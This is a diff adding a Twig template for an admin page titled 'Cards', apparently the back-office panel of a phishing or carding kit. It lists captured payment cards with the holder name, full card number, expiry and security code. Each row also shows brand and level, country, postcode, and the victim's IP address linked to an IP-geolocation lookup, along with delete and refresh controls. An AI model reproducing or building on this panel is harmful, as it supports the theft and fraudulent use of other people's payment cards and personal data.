@@ -1,0 +1,111 @@
+{% extends 'base.html.twig' %}
+{% block sub_title %}  Cards  {% endblock %}
+    {% block stylesheets %}
+        {{ parent() }}
+        <link rel="stylesheet" href="{{ asset('assets/datatables/css/dataTables.bootstrap.css') }}">
+        <link rel="stylesheet" href="{{ asset('assets/css/dots.css') }}">
+        <link rel="stylesheet" href="{{ asset('assets/css/font-awesome.min.css') }}">
+    {% endblock %}
+    {% block javascripts %}
+        {{ parent() }}
+        <script src="{{ asset('assets/datatables/js/jquery.dataTables.min.js') }}"></script>
+        <script src="{{ asset('assets/datatables/js/dataTables.bootstrap.js') }}"></script>
+        <script src="{{ asset('assets/js/custom.js') }}"></script>
+        <script>
+            $(document).ready(function () {
+                $("#preinscri").DataTable({
+
+                    language: {
+                        processing: "Traitement en cours...",
+                        search: "Rechercher&nbsp;:",
+                        lengthMenu: "Afficher _MENU_ &eacute;l&eacute;ments",
+                        info: "Affichage de l'&eacute;lement _START_ &agrave; _END_ sur _TOTAL_ &eacute;l&eacute;ments",
+                        infoEmpty: "Affichage de l'&eacute;lement 0 &agrave; 0 sur 0 &eacute;l&eacute;ments",
+                        infoFiltered: "(filtr&eacute; de _MAX_ &eacute;l&eacute;ments au total)",
+                        infoPostFix: "",
+                        loadingRecords: "Chargement en cours...",
+                        zeroRecords: "Aucun &eacute;l&eacute;ment &agrave; afficher",
+                        emptyTable: "Aucune donnée disponible dans le tableau",
+                        paginate: {
+                            first: "Premier",
+                            previous: "Pr&eacute;c&eacute;dent",
+                            next: "Suivant",
+                            last: "Dernier"
+                        },
+                        aria: {
+                            sortAscending: ": activer pour trier la colonne par ordre croissant",
+                            sortDescending: ": activer pour trier la colonne par ordre décroissant"
+                        }
+                    },
+                    "pageLength": 25
+
+                });
+            });
+        </script>
+    {% endblock %}
+    {% block content %}
+        <div class="box box-primary">
+            <div class="box-header">
+            </div>
+            <div class="box-body">
+                <div class="table-responsive">
+                    <table id="preinscri" class="table table-bordered table-striped">
+                        <thead>
+                        <tr>
+                            <th>ID</th>
+                            <th>CARD</th>
+                            <th>SEEN</th>
+                            <th>INFO</th>
+                            <th>LOCATION</th>
+                            <th>OTHER</th>
+                        </tr>
+                        </thead>
+                        <tbody>
+                        {% for card in cards %}
+                            <tr>
+                                <td> {{ card.id }}</td>
+                                <td>
+                                    <a href="{{ path('blog_list', { 'id': card.id }) }}"
+                                       onclick=" window.open('{{ path('blog_list', { 'id': card.id }) }}',
+                                    '_blank','width=800,height=600,scrollbars=1,menubar=no,status=yes,resizable=1,screenx=0,screeny=0');
+                                    return false;">
+                                     {{ card.addDate |date('Y-m-d H:i') }}
+                                    </a> -
+                                    {{ card.ccname }}
+                                    {{ card.ccno }} -
+                                    {{ card.ccexp }} -
+                                    {{ card.secode }}
+                                    {{  card.ccno |replace({' ': ''}) }}
+                                </td>
+                                <td> TEST </td>
+                                <td>{{ card.ccbrand }} - {{ card.cclevel }} - {{ card.cctype }} - {{ card.cclevel }}</td>
+                                <td>{{ card.country }} {{ card.postcode }} <a href="http://www.localiser-ip.com/?ip={{ card.ip }}"  target="_blank" > {{ card.ip }}</a></td>
+                                <td class="dots_parent">
+                                    <span>ooo</span>
+                                    <ul   id="myDropdown" class="dots">
+                                        <a href=".modal"
+                                           onclick=" window.open('{{ path('blog_list', { 'id': card.id }) }}',
+                                                   '_blank','width=800,height=600,scrollbars=1,menubar=no,status=yes,resizable=1,screenx=0,screeny=0');
+                                                   return false;" class="option">
+                                            <i class="fa fa-refresh fa-fw"></i></a>
+                                        <a href="{{ path('blog_list', { 'id': card.id }) }}"
+                                           onclick=" window.open('{{ path('blog_list', { 'id': card.id }) }}',
+                                                   '_blank','width=800,height=600,scrollbars=1,menubar=no,status=yes,resizable=1,screenx=0,screeny=0');
+                                                   return false;"class="option">
+                                            <i class="fa fa-comment" ></i></a>
+                                        <a class="option delete" data-id="{{ card.id }}" data-url-delete="{{ path('delete_v') }}">
+                                            <i class="fa fa-times fa-fw"></i></a>
+                                    </ul>
+                                </td>
+
+                            </tr>
+                        {% endfor %}
+                        </tbody>
+                    </table>
+                </div>
+                <!-- /.box-body -->
+            </div>
+        </div>
+
+        </div>
+    {% endblock %}
